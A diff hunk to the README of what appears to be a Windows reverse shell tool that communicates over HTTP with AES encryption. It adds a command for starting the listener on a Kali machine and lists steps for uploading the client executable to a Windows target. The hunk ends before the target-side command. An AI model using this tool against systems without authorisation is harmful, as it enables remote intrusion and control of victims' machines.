@@ -9,7 +9,10 @@ A Windows Reverse Shell using HTTP methods with 256-bit AES encryption written i
 If I get some time (and encouragement), I will convert this to a python3 project and probably use some oop.
 
 ## Usage:
-1. Run server_shell_http.py from kali
+1. Run server_shell_http.py from kali (and choose port 80)
+```
+sudo python2 server_shell_http.py <kali_ip>
+```
 2. Upload client_shell_http.exe to Windows target
 3. Run the following command on the target for a reverse shell without proxy:
 ```
